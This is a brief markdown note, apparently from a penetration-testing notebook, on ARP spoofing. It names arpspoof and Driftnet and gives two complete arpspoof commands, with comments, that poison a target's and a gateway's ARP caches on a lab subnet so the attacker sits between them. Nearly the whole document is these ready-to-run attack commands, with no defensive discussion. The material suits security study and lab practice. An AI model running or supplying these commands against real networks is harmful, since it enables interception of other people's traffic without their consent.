---
description: mapping ip address to mac addresses.
---

# ARP SPOOFING

There are various tools used to perform this attacks which includes: **Arpspoof or Driftnet.**

### arpspoof attack:

```
# "-i" denotes the interface to perform the attack, "-t" signifies the target, so we specify the target and the gateway to fool the target/client that we are the AP/gateway.
arpspoof -i eth0 -t 192.168.81.129 192.168.81.2

# "-i" denotes the interface to perform the attack, "-t" signifies the target, so we specify the target and the gateway to fool the AP/Gateway that we are the client.
arpspoof -i eth0 -t 192.168.81.2 192.168.81.129
```

****









